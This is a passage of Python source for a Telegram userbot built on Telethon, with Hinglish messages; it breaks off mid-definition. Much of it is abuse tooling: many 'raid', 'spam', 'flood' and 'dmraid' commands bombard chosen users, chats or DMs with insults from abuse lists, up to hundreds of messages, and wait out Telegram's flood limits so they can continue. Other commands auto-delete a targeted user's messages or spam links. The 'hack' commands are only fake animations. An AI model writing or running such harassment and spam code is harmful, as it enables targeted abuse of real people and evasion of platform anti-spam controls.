                        await ubot.send_file(chat_id, w_data['media'], caption=w_data['text'])
                    else:
                        await ubot.send_message(chat_id, w_data['text'])
                except Exception:
                    pass

    # 1. AUTO-REACT (A): Self Messages Auto-React
    @ubot.on(events.NewMessage(outgoing=True))
    async def self_react_handler(event):
        if owner_id in afk_status and not event.raw_text.startswith(".afk"):
            afk_status.pop(owner_id, None)
        raw = (event.raw_text or "").strip()
        if raw.startswith(".") or raw.startswith("/"):
            return
        chat_id = event.chat_id
        if chat_id in self_reacts:
            await send_tg_reaction(chat_id, event.id, self_reacts[chat_id])

    @ubot.on(events.NewMessage(pattern=r'^\.ar\b', outgoing=True))
    async def ar_command(event):
        args = event.raw_text.split(maxsplit=1)
        chat_id = event.chat_id
        if len(args) < 2 or not args[1].strip():
            await event.edit("ℹ️ **Istemaal:** `.ar 🔥`")
            return
        emoji = args[1].strip().split()[0]
        ok = await send_tg_reaction(chat_id, event.id, emoji)
        if ok:
            self_reacts[chat_id] = emoji
            await event.edit(f"✅ **Self Auto-React chalu:** {emoji}")
        else:
            await event.edit(f"❌ **Reaction nahi lag paaya (`{emoji}`). Kisi doosre emoji se try karein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.dar$', outgoing=True))
    async def dar_command(event):
        chat_id = event.chat_id
        if chat_id in self_reacts:
            del self_reacts[chat_id]
            await event.edit("🛑 **Self Auto-React band kar diya gaya hai.**")
        else:
            await event.edit("ℹ️ Yahan Self Auto-React chalu nahi hai.")

    # 2. AUTO-REACT (B): Target User Auto-React with '🔥'
    @ubot.on(events.NewMessage(incoming=True))
    async def uar_incoming_handler(event):
        chat_id = event.chat_id
        sender_id = event.sender_id
        if chat_id in user_react_targets and sender_id in user_react_targets[chat_id]:
            await send_tg_reaction(chat_id, event.id, "🔥")

    @ubot.on(events.NewMessage(pattern=r'^\.uar\b', outgoing=True))
    async def uar_command(event):
        chat_id = event.chat_id
        args = event.raw_text.split()
        target_user = None

        if event.is_reply:
            reply_msg = await event.get_reply_message()
            target_user = reply_msg.sender_id
        elif len(args) > 1:
            username = args[1]
            try:
                user_entity = await ubot.get_entity(username)
                target_user = user_entity.id
            except Exception:
                await event.edit("❌ **User ya username sahi nahi hai.**")
                return

        if target_user:
            if chat_id not in user_react_targets:
                user_react_targets[chat_id] = set()
            user_react_targets[chat_id].add(target_user)
            await event.edit("✅ **Target User Auto-React (`🔥`) chalu ho gaya hai.**")
        else:
            await event.edit("ℹ️ **Istemaal:** Kisi message par reply karein ya `.uar @username` likhein.")

    @ubot.on(events.NewMessage(pattern=r'^\.duar$', outgoing=True))
    async def duar_command(event):
        chat_id = event.chat_id
        if chat_id in user_react_targets:
            del user_react_targets[chat_id]
            await event.edit("🛑 **User Auto-React band kar diya gaya hai.**")
        else:
            await event.edit("ℹ️ Is chat mein koi User Auto-React chalu nahi hai.")

    # 3. AUTO-REACT (C): All Messages Auto-React with selected reactions
    @ubot.on(events.NewMessage(incoming=True))
    async def rar_incoming_handler(event):
        chat_id = event.chat_id
        if chat_id in all_reacts and all_reacts[chat_id]:
            emoji = random.choice(all_reacts[chat_id])
            await send_tg_reaction(chat_id, event.id, emoji)

    @ubot.on(events.NewMessage(pattern=r'^\.rar\b', outgoing=True))
    async def rar_command(event):
        args = event.raw_text.split()
        chat_id = event.chat_id
        emojis = [e.strip() for e in args[1:] if e.strip()]
        if not emojis:
            await event.edit("ℹ️ **Istemaal:** `.rar 🔥 💀 ⚡`")
            return
        ok = await send_tg_reaction(chat_id, event.id, emojis[0])
        if ok:
            all_reacts[chat_id] = emojis
            await event.edit(f"✅ **All-Message Auto-React chalu:** {' '.join(emojis)}")
        else:
            await event.edit(f"❌ **All-Message Auto-React set nahi ho saka (`{emojis[0]}`).**")

    @ubot.on(events.NewMessage(pattern=r'^\.drar$', outgoing=True))
    async def drar_command(event):
        chat_id = event.chat_id
        if chat_id in all_reacts:
            del all_reacts[chat_id]
            await event.edit("🛑 **All-Message Auto-React band kar diya gaya hai.**")
        else:
            await event.edit("ℹ️ Is chat mein All-Message Auto-React chalu nahi hai.")

    # 4. REPLY RAID (.rraid / .drraid)
    @ubot.on(events.NewMessage(pattern=r'^\.rraid$', outgoing=True))
    async def rraid_start_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi message par reply karke `.rraid` likhein.**")
            return
        reply = await event.get_reply_message()
        if not reply.sender_id:
            await event.edit("❌ **Target user ID nahi mil saki.**")
            return
        rraid_targets.add((event.chat_id, reply.sender_id))
        await event.edit(f"✅ **RRAID chalu (`{reply.sender_id}`).**")

    @ubot.on(events.NewMessage(pattern=r'^\.drraid$', outgoing=True))
    async def rraid_stop_cmd(event):
        if event.is_reply:
            reply = await event.get_reply_message()
            rraid_targets.discard((event.chat_id, reply.sender_id))
            await event.edit(f"🛑 **RRAID band (`{reply.sender_id}`).**")
        else:
            for item in [x for x in rraid_targets if x[0] == event.chat_id]:
                rraid_targets.discard(item)
            await event.edit("🛑 **Is chat ke saare RRAID band kar diye gaye hain.**")

    @ubot.on(events.NewMessage(incoming=True))
    async def rraid_watcher(event):
        if event.sender_id and (event.chat_id, event.sender_id) in rraid_targets:
            try:
                await event.reply(random.choice(GAALIS))
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                pass

    # 5. SPAM / FASTSPAM / FLOOD
    async def _spam_worker(target_chat, count, text, delay):
        try:
            for _ in range(count):
                if target_chat not in active_raids:
                    break
                try:
                    await ubot.send_message(target_chat, text)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                except Exception:
                    break
                if delay > 0:
                    await asyncio.sleep(delay)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.(spam|fastspam|flood)\b', outgoing=True))
    async def spam_cmd_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=2)
        if len(parts) < 3 or not parts[1].isdigit():
            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} [count] [text]`")
            return
        count = max(1, min(int(parts[1]), 300))
        text = parts[2]
        delay = 0.05 if cmd == "fastspam" else (0.15 if cmd == "flood" else 0.25)

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_spam_worker(event.chat_id, count, text, delay))
        active_raid_tasks[event.chat_id] = task

    # 6. RAID & ONERAID (.raid / .oneraid)
    async def _basic_raid_worker(target_chat, reply_to, count, single_only=False):
        try:
            for _ in range(count):
                if target_chat not in active_raids:
                    break
                msg = random.choice(SINGLE_GAALIS) if single_only else random.choice(GAALIS)
                try:
                    if reply_to:
                        await ubot.send_message(target_chat, msg, reply_to=reply_to)
                    else:
                        await ubot.send_message(target_chat, msg)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                except Exception:
                    break
                await asyncio.sleep(0.2)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.(raid|oneraid)\b', outgoing=True))
    async def basic_raid_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 15
        count = max(1, min(count, 300))

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_basic_raid_worker(event.chat_id, event.reply_to_msg_id, count, single_only=(cmd == "oneraid")))
        active_raid_tasks[event.chat_id] = task

    # 7. LANGUAGE RAIDS (.engraid / .praid / .braid)
    async def _multi_lang_raid_worker(target_chat, reply_to, count, pool):
        try:
            for _ in range(count):
                if target_chat not in active_raids:
                    break
                msg = random.choice(pool)
                try:
                    if reply_to:
                        await ubot.send_message(target_chat, msg, reply_to=reply_to)
                    else:
                        await ubot.send_message(target_chat, msg)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                except Exception:
                    break
                await asyncio.sleep(0.2)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.(engraid|praid|braid)\b', outgoing=True))
    async def multi_lang_raid_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 15
        count = max(1, min(count, 300))

        pools = {
            "engraid": ENGLISH_RAIDS,
            "praid": PUNJABI_RAIDS,
            "braid": BENGALI_RAIDS,
        }
        pool = pools[cmd]

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_multi_lang_raid_worker(event.chat_id, event.reply_to_msg_id, count, pool))
        active_raid_tasks[event.chat_id] = task
        # 8. STYLED & SPECIAL RAIDS (.araid, .saraid, .oaraid, .faraid, .earaid, .dmraid, .mraid, .delayraid, .emoraid, .emojispam, .mixraid, .tagraid, .capsraid, .slowraid, .badaid, .saraid2, .ultraid, .auto, .chup, .bol)
    def _build_raid_payload(mode, event, custom_text=None):
        if custom_text:
            return custom_text
        base = random.choice(GAALIS)
        if mode == "araid":
            return format_araid(base)
        if mode == "saraid":
            return format_saraid(random.choice(SINGLE_GAALIS))
        if mode == "oaraid":
            return format_oaraid(base)
        if mode == "faraid":
            return format_faraid(random.choice(SINGLE_GAALIS))
        if mode == "earaid":
            return random.choice(EARAID_LIST)
        if mode == "mraid":
            return random.choice(MULTI_LINE_RAIDS)
        if mode == "emoraid":
            return f"{random.choice(RAID_EMOJIS)} {base} {random.choice(RAID_EMOJIS)}"
        if mode == "capsraid":
            return base.upper()
        if mode == "tagraid":
            return f"{base} @everyone"
        if mode == "badaid":
            return f"═══『 ⚡ KASHYAP RAID ⚡ 』═══\n{base}\n════════════════════════════"
        if mode == "saraid2":
            return f"⚡ {format_saraid(random.choice(SINGLE_GAALIS))} ⚡"
        if mode == "ultraid":
            return f"🔥💣 {base.upper()} 💣🔥"
        if mode == "mixraid":
            choice = random.choice(["a", "s", "o", "f", "e", "m"])
            return _build_raid_payload({"a": "araid", "s": "saraid", "o": "oaraid", "f": "faraid", "e": "earaid", "m": "mraid"}[choice], event)
        return base

    async def _generic_raid_worker(target_chat, reply_to, count, mode, delay=0.2, custom_text=None):
        try:
            for _ in range(count):
                if target_chat not in active_raids:
                    break
                payload = _build_raid_payload(mode, None, custom_text=custom_text)
                try:
                    if reply_to:
                        await ubot.send_message(target_chat, payload, reply_to=reply_to)
                    else:
                        await ubot.send_message(target_chat, payload)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 0.5)
                except Exception:
                    break
                if delay > 0:
                    await asyncio.sleep(delay)
        finally:
            active_raids.discard(target_chat)
            active_raid_tasks.pop(target_chat, None)

    @ubot.on(events.NewMessage(pattern=r'^\.(araid|saraid|oaraid|faraid|earaid|mraid|emoraid|mixraid|tagraid|capsraid|slowraid|badaid|saraid2|ultraid)\b', outgoing=True))
    async def styled_raid_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        default_cnt = 10 if cmd in ("mixraid", "tagraid", "capsraid", "slowraid") else 15
        max_cnt = 50 if cmd in ("mixraid", "tagraid", "capsraid", "slowraid") else 300
        count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else default_cnt
        count = max(1, min(count, max_cnt))
        delay = 1.2 if cmd == "slowraid" else 0.22

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_generic_raid_worker(event.chat_id, event.reply_to_msg_id, count, cmd, delay=delay))
        active_raid_tasks[event.chat_id] = task

    @ubot.on(events.NewMessage(pattern=r'^\.delayraid\b', outgoing=True))
    async def delayraid_handler(event):
        parts = event.raw_text.split()
        if len(parts) < 3:
            await event.edit("ℹ️ **Istemaal:** `.delayraid [sec] [count]`")
            return
        try:
            delay = max(0.1, min(float(parts[1]), 60.0))
            count = max(1, min(int(parts[2]), 300))
        except ValueError:
            await event.edit("❌ **Delay aur count number mein dein.**")
            return

        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_generic_raid_worker(event.chat_id, event.reply_to_msg_id, count, "raid", delay=delay))
        active_raid_tasks[event.chat_id] = task

    @ubot.on(events.NewMessage(pattern=r'^\.emojispam\b', outgoing=True))
    async def emojispam_handler(event):
        parts = event.raw_text.split(maxsplit=3)
        if len(parts) < 4 or not parts[1].isdigit():
            await event.edit("ℹ️ **Istemaal:** `.emojispam [count] [emoji] [text]`")
            return
        count = max(1, min(int(parts[1]), 300))
        emo = parts[2]
        txt = f"{emo} {parts[3]} {emo}"
        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_spam_worker(event.chat_id, count, txt, 0.15))
        active_raid_tasks[event.chat_id] = task

    @ubot.on(events.NewMessage(pattern=r'^\.dmraid\b', outgoing=True))
    async def dmraid_handler(event):
        parts = event.raw_text.split(maxsplit=1)
        count = max(1, min(int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10, 100))
        target_id = None
        if event.is_reply:
            rep = await event.get_reply_message()
            target_id = rep.sender_id
        elif event.is_private:
            target_id = event.chat_id
        if not target_id:
            await event.edit("ℹ️ **DM ya reply se `.dmraid [count]` chalayein.**")
            return
        await event.edit(f"🚀 **DM Raid shuru (`{count}` msgs)...**")
        for _ in range(count):
            if target_id not in active_raids and event.chat_id not in active_raids:
                break
            try:
                await ubot.send_message(target_id, random.choice(GAALIS))
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                break
            await asyncio.sleep(0.35)

    @ubot.on(events.NewMessage(pattern=r'^\.auto\b', outgoing=True))
    async def auto_link_handler(event):
        parts = event.raw_text.split()
        if len(parts) < 3 or not parts[2].isdigit():
            await event.edit("ℹ️ **Istemaal:** `.auto [link] [count]`")
            return
        link = parts[1]
        count = max(1, min(int(parts[2]), 100))
        if event.chat_id in active_raid_tasks:
            active_raid_tasks[event.chat_id].cancel()
        active_raids.add(event.chat_id)
        try:
            await event.delete()
        except Exception:
            pass
        task = asyncio.create_task(_spam_worker(event.chat_id, count, f"⚡ {link} ⚡", 0.3))
        active_raid_tasks[event.chat_id] = task

    @ubot.on(events.NewMessage(pattern=r'^\.chup$', outgoing=True))
    async def chup_cmd(event):
        if event.is_reply:
            rep = await event.get_reply_message()
            if rep.sender_id:
                chup_muted_users.add(rep.sender_id)
                await event.edit(f"🤫 **User `{rep.sender_id}` chup list mein add ho gaya.**")
        else:
            await event.edit("ℹ️ **Kisi message par reply karke `.chup` likhein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.bol$', outgoing=True))
    async def bol_cmd(event):
        if event.is_reply:
            rep = await event.get_reply_message()
            chup_muted_users.discard(rep.sender_id)
            await event.edit(f"🗣️ **User `{rep.sender_id}` chup list se hata diya gaya.**")
        else:
            chup_muted_users.clear()
            await event.edit("🗣️ **Chup list clear kar di gayi hai.**")

    @ubot.on(events.NewMessage(incoming=True))
    async def chup_watcher(event):
        if event.sender_id and event.sender_id in chup_muted_users:
            try:
                await event.delete()
            except Exception:
                pass

    # 9. HACK & ANIMATION (50s HACKS INCLUDED)
    async def _run_50s_hack(event, title, stages):
        msg = await event.edit(f"⚡ **{title} INITIATED (50s)...**")
        total = 50
        step_dur = 2.0
        steps_count = int(total / step_dur)
        for i in range(steps_count):
            pct = min(100, int(((i + 1) / steps_count) * 100))
            bar_len = 12
            filled = int((pct / 100) * bar_len)
            bar = "█" * filled + "░" * (bar_len - filled)
            stage_line = stages[i % len(stages)]
            try:
                await msg.edit(
                    f"┏━「 💀 **{title}** 」━┓\n"
                    f"┃ • **STATUS:** `{stage_line}`\n"
                    f"┃ • **PROGRESS:** `[{bar}] {pct}%`\n"
                    f"┃ • **TIME:** `{(i+1)*2}s / 50s`\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                pass
            await asyncio.sleep(step_dur)
        await msg.edit(f"✅ **{title} COMPLETE (50s) — BY {OWNER_NAME}!**")

    @ubot.on(events.NewMessage(pattern=r'^\.(netghost|rootkit|cryptohack|zeroday)$', outgoing=True))
    async def hack_50s_handler(event):
        cmd = event.pattern_match.group(1).upper()
        pools = {
            "NETGHOST": ["GHOSTING SOCKET", "SPOOFING NODE", "BYPASSING RELAY", "MASKING TRACE"],
            "ROOTKIT": ["MOUNTING KERNEL HOOK", "ELEVATING PRIVILEGES", "HIDING PROCESS", "INJECTING MODULE"],
            "CRYPTOHACK": ["PROBING CIPHER", "TESTING KEYSPACE", "DECRYPTING BLOCKS", "VERIFYING HASH"],
            "ZERODAY": ["SCANNING EXPLOIT", "CRAFTING PAYLOAD", "TRIGGERING VECTOR", "GAINING SHELL"],
        }
        await _run_50s_hack(event, cmd, pools[cmd])

    @ubot.on(events.NewMessage(pattern=r'^\.(hack|matrix|scan|loading|boom|fbi|fuck)$', outgoing=True))
    async def quick_anim_handler(event):
        cmd = event.pattern_match.group(1)
        frames_map = {
            "hack": ["💻 `Connecting to target...`", "🔓 `Bypassing firewall... 45%`", "📂 `Dumping packets... 88%`", "✅ `Access simulated — KASHYAP USERBOT`"],
            "matrix": ["🟩 `01010110 10010110`", "🟩 `11001010 00110101`", "🟩 `SYSTEM MATRIX SYNCED`"],
            "scan": ["🔍 `Scanning open ports...`", "📡 `Checking latency & routes...`", "✅ `Scan complete.`"],
            "loading": ["⏳ `Loading modules... [██░░░░░░░░] 20%`", "⏳ `Loading modules... [██████░░░░] 60%`", "✅ `Ready!`"],
            "boom": ["💣 `Fuse lit... 3`", "💥 `Fuse lit... 2`", "🔥 `Fuse lit... 1`", "💥💥 **BOOOM!** 💥💥"],
            "fbi": ["🚨 `FBI OPEN UP` 🚨", "🚔 `PERIMETER LOCKED` 🚔", "✅ `TARGET SECURED`"],
            "fuck": ["🖕 `🖕🖕🖕`", "🔥 `🖕🖕🖕🖕🖕`", "⚡ `DONE`"],
        }
        msg = await event.edit(frames_map[cmd][0])
        for fr in frames_map[cmd][1:]:
            await asyncio.sleep(0.7)
            try:
                await msg.edit(fr)
            except Exception:
                pass

    @ubot.on(events.NewMessage(pattern=r'^\.(bruteforce|packetflood|sysbreach|pulse|countanim|glitch)\b', outgoing=True))
    async def iter_anim_handler(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        n = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
        n = max(1, min(n, 50))
        msg = await event.edit(f"⚡ `{cmd.upper()}` starting ({n} steps)...")
        for i in range(1, n + 1):
            if cmd == "glitch":
                txt = f"⚡ `GLITCH_{i}x#$_%@{random.randint(10,99)}`"
            elif cmd == "pulse":
                txt = f"💓 `PULSE [{i}/{n}]` {'♥' * ((i % 5) + 1)}"
            elif cmd == "countanim":
                txt = f"🔢 **COUNT:** `{i}` / `{n}`"
            else:
                txt = f"⚙️ `{cmd.upper()}` step `{i}/{n}`..."
            try:
                await msg.edit(txt)
            except FloodWaitError as f:
                await asyncio.sleep(f.seconds + 0.5)
            except Exception:
                pass
            await asyncio.sleep(0.35)
        await msg.edit(f"✅ `{cmd.upper()}` finished ({n} steps).")

    @ubot.on(events.NewMessage(pattern=r'^\.type\b', outgoing=True))
    async def type_anim_handler(event):
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            await event.edit("ℹ️ **Istemaal:** `.type [text]`")
            return
        full = parts[1].strip()
        step = max(1, len(full) // 8)
        msg = await event.edit("▌")
        for idx in range(step, len(full) + 1, step):
            try:
                await msg.edit(f"{full[:idx]}▌")
            except Exception:
                pass
            await asyncio.sleep(0.25)
        await msg.edit(full)

    # 10. GROUP, ADMIN & AUTOPIN
    async def _target_from_reply_or_arg(event):
        if event.is_reply:
            rep = await event.get_reply_message()
            return rep.sender_id
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) > 1 and parts[1].strip():
            try:
                ent = await ubot.get_entity(parts[1].strip())
                return getattr(ent, "id", None)
            except Exception:
                return None
        return None

    @ubot.on(events.NewMessage(pattern=r'^\.ban\b', outgoing=True))
    async def ban_cmd(event):
        uid = await _target_from_reply_or_arg(event)
        if not uid:
            await event.edit("ℹ️ **Reply ya user/ID ke saath `.ban` likhein.**")
            return
        try:
            await ubot.edit_permissions(event.chat_id, uid, view_messages=False)
            await event.edit(f"🔨 **Banned `{uid}`.**")
        except Exception as e:
            await event.edit(f"❌ **Ban fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.unban\b', outgoing=True))
    async def unban_cmd(event):
        uid = await _target_from_reply_or_arg(event)
        if not uid:
            await event.edit("ℹ️ **Reply ya user/ID ke saath `.unban` likhein.**")
            return
        try:
            await ubot.edit_permissions(event.chat_id, uid, view_messages=True)
            await event.edit(f"✅ **Unbanned `{uid}`.**")
        except Exception as e:
            await event.edit(f"❌ **Unban fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.kick\b', outgoing=True))
    async def kick_cmd(event):
        uid = await _target_from_reply_or_arg(event)
        if not uid:
            await event.edit("ℹ️ **Reply ya user/ID ke saath `.kick` likhein.**")
            return
        try:
            await ubot.kick_participant(event.chat_id, uid)
            await event.edit(f"👢 **Kicked `{uid}`.**")
        except Exception as e:
            await event.edit(f"❌ **Kick fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.mute\b', outgoing=True))
    async def mute_cmd(event):
        uid = await _target_from_reply_or_arg(event)
        if not uid:
            await event.edit("ℹ️ **Reply ya user/ID ke saath `.mute` likhein.**")
            return
        try:
            await ubot.edit_permissions(event.chat_id, uid, send_messages=False)
            await event.edit(f"🔇 **Muted `{uid}`.**")
        except Exception as e:
            await event.edit(f"❌ **Mute fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.unmute\b', outgoing=True))
    async def unmute_cmd(event):
        uid = await _target_from_reply_or_arg(event)
        if not uid:
            await event.edit("ℹ️ **Reply ya user/ID ke saath `.unmute` likhein.**")
            return
        try:
            await ubot.edit_permissions(event.chat_id, uid, send_messages=True)
            await event.edit(f"🔊 **Unmuted `{uid}`.**")
        except Exception as e:
            await event.edit(f"❌ **Unmute fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.pin$', outgoing=True))
    async def pin_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi message par reply karke `.pin` likhein.**")
            return
        rep = await event.get_reply_message()
        try:
            await ubot.pin_message(event.chat_id, rep.id, notify=False)
            await event.edit("📌 **Message pin kar diya gaya.**")
        except Exception as e:
            await event.edit(f"❌ **Pin fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.unpin$', outgoing=True))
    async def unpin_cmd(event):
        try:
            rep = await event.get_reply_message() if event.is_reply else None
            await ubot.unpin_message(event.chat_id, rep.id if rep else None)
            await event.edit("📍 **Unpin ho gaya.**")
        except Exception as e:
            await event.edit(f"❌ **Unpin fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.del$', outgoing=True))
    async def del_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi message par reply karke `.del` likhein.**")
            return
        rep = await event.get_reply_message()
        try:
            await ubot.delete_messages(event.chat_id, [event.id, rep.id])
        except Exception:
            try:
                await event.delete()
            except Exception:
                pass

    @ubot.on(events.NewMessage(pattern=r'^\.invite$', outgoing=True))
    async def invite_cmd(event):
        try:
            res = await ubot(ExportChatInviteRequest(peer=event.chat_id))
            await event.edit(f"🔗 **Invite Link:** {res.link}")
        except Exception as e:
            await event.edit(f"❌ **Invite link nahi ban paaya:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.purge\b', outgoing=True))
    async def purge_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
        limit = max(1, min(limit, 100))
        msg_ids = [event.id]
        if event.is_reply:
            rep = await event.get_reply_message()
            async for m in ubot.iter_messages(event.chat_id, min_id=rep.id - 1, max_id=event.id):
                msg_ids.append(m.id)
        else:
            async for m in ubot.iter_messages(event.chat_id, limit=limit):
                msg_ids.append(m.id)
        try:
            await ubot.delete_messages(event.chat_id, list(set(msg_ids)))
            done = await ubot.send_message(event.chat_id, f"🧹 **Purged `{len(set(msg_ids))}` messages.**")
            await asyncio.sleep(2)
            await done.delete()
        except Exception as e:
            await event.edit(f"❌ **Purge fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.autopin\s+(on|off)(?:\s+(-?\d+))?$', outgoing=True))
    async def autopin_cmd(event):
        state = event.pattern_match.group(1).lower()
        cid_arg = event.pattern_match.group(2)
        target = int(cid_arg) if cid_arg else event.chat_id
        if state == "on":
            autopin_chats.add(target)
            await event.edit(f"📌 **AutoPin ON (`{target}`).**")
        else:
            autopin_chats.discard(target)
            await event.edit(f"📍 **AutoPin OFF (`{target}`).**")

    @ubot.on(events.NewMessage(pattern=r'^\.dmautopin\s+(on|off)(?:\s+(\d+))?$', outgoing=True))
    async def dmautopin_cmd(event):
        state = event.pattern_match.group(1).lower()
        tid_arg = event.pattern_match.group(2)
        target = int(tid_arg) if tid_arg else (event.chat_id if event.is_private else None)
        if not target:
            await event.edit("ℹ️ **DM mein chalayein ya user ID dein.**")
            return
        if state == "on":
            dm_autopin_targets.add(target)
            await event.edit(f"📌 **DM AutoPin ON (`{target}`).**")
        else:
            dm_autopin_targets.discard(target)
            await event.edit(f"📍 **DM AutoPin OFF (`{target}`).**")

    @ubot.on(events.NewMessage(outgoing=True))
    async def autopin_watcher(event):
        raw = (event.raw_text or "").strip()
        if raw.startswith(".") or raw.startswith("/"):
            return
        if event.chat_id in autopin_chats or (event.is_private and event.chat_id in dm_autopin_targets):
            try:
                await ubot.pin_message(event.chat_id, event.id, notify=False)
            except Exception:
                pass

    @ubot.on(events.NewMessage(pattern=r'^\.tagall\b', outgoing=True))
    async def tagall_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        extra = parts[1].strip() if len(parts) > 1 else ""
        mentions = []
        async for user in ubot.iter_participants(event.chat_id, limit=40):
            if not getattr(user, "bot", False):
                name = getattr(user, "first_name", "User") or "User"
                mentions.append(f"[{name}](tg://user?id={user.id})")
        if not mentions:
            await event.edit("ℹ️ **Koi member nahi mila.**")
            return
        await event.edit(f"📣 **TAG ALL** {extra}\n" + " ".join(mentions))

    @ubot.on(events.NewMessage(pattern=r'^\.admins$', outgoing=True))
    async def admins_cmd(event):
        lines = ["👮 **Admins:**"]
        async for u in ubot.iter_participants(event.chat_id, filter=ChannelParticipantsAdmins):
            lines.append(f"• `{u.id}` — **{getattr(u, 'first_name', 'Admin')}**")
        await event.edit("\n".join(lines))

    @ubot.on(events.NewMessage(pattern=r'^\.bots$', outgoing=True))
    async def bots_cmd(event):
        lines = ["🤖 **Bots:**"]
        async for u in ubot.iter_participants(event.chat_id, filter=ChannelParticipantsBots):
            lines.append(f"• `{u.id}` — **@{getattr(u, 'username', 'bot')}**")
        await event.edit("\n".join(lines))

    @ubot.on(events.NewMessage(pattern=r'^\.pingall$', outgoing=True))
    async def pingall_cmd(event):
        mentions = []
        async for user in ubot.iter_participants(event.chat_id, limit=25):
            if not getattr(user, "bot", False):
                mentions.append(f"[⚡](tg://user?id={user.id})")
        if not mentions:
            await event.edit("ℹ️ **Koi member nahi mila.**")
            return
        await event.edit("🔔 **PING:** " + " ".join(mentions))

    # 11. DM, REACT & CONTROL (.dmblock, .dmwelcome, .dmmute, .undmmute, .say30, .stop30, .stop, .stopall, .clear, .restart, .help)
    @ubot.on(events.NewMessage(pattern=r'^\.dmblock\s+(on|off)$', outgoing=True))
    async def dmblock_cmd(event):
        mode = event.pattern_match.group(1).lower() == "on"
        dm_block_enabled[owner_id] = mode
        await event.edit(f"🛡️ **DM Auto-Block:** `{'ON' if mode else 'OFF'}`")

    @ubot.on(events.NewMessage(pattern=r'^\.dmwelcome\s+(on|off|reset)$', outgoing=True))
    async def dmwelcome_cmd(event):
        act = event.pattern_match.group(1).lower()
        if act == "on":
            dm_welcome_enabled[owner_id] = True
            await event.edit("👋 **DM 1x Welcome:** `ON`")
        elif act == "off":
            dm_welcome_enabled[owner_id] = False
            await event.edit("👋 **DM 1x Welcome:** `OFF`")
        elif act == "reset":
            dm_welcomed_users[owner_id] = set()
            await event.edit("🔄 **DM 1x Welcome user list reset ho gayi.**")

    @ubot.on(events.NewMessage(pattern=r'^\.dmmute$', outgoing=True))
    async def dmmute_cmd(event):
        if not event.is_private:
            await event.edit("ℹ️ **Kisi ke DM mein `.dmmute` likhein.**")
            return
        dm_muted_users.setdefault(owner_id, set()).add(event.chat_id)
        await event.edit("🔇 **Is DM user ke messages ab auto-delete honge.**")

    @ubot.on(events.NewMessage(pattern=r'^\.undmmute$', outgoing=True))
    async def undmmute_cmd(event):
        if not event.is_private:
            await event.edit("ℹ️ **Kisi ke DM mein `.undmmute` likhein.**")
            return
        dm_muted_users.setdefault(owner_id, set()).discard(event.chat_id)
        await event.edit("🔊 **Is DM user ka mute hata diya gaya.**")

    @ubot.on(events.NewMessage(incoming=True))
